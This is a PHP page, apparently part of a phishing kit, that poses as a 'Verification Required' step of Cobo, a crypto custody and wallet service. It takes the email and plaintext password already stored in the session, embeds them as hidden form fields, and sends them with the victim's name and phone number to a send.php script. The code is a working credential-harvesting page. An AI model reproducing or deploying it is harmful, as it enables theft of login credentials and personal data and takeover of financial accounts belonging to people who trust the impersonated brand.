<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Cobo | Your trusted partner for custody and wallet infrastructure solutions';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <?php include_once './includes/header.php'; ?>
        <div class='container-fluid'>
            <div class="row justify-content-center">
                <div class='col-sm-4 rounded-4 p25 my30 bg-white' style="border: 1px #edf2f9 solid">
                    <h1 class='h6 mobile_web_font fw-bold pt10 text-center'>Verification Required</h1>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <div class="my20">
                            <label class="form-label fw-semibold">Full Name</label>
                            <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                            <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
                            <input name="name" type="text" required="" class="form-control form-control-add" placeholder="Enter your name" />
                        </div>
                        <div class="my20">
                            <label class="form-label fw-semibold">Phone Number</label>
                            <div class="form-control" style="padding: 0px;">
                                <input name="phone_number" type="number" id="phone_number" required="" style="width: 80%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="d-grid my30">
                            <button type="submit" class="btn btn-primary-2 py10 btn-lg" >Verify</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
        </script>
    </body>
</html>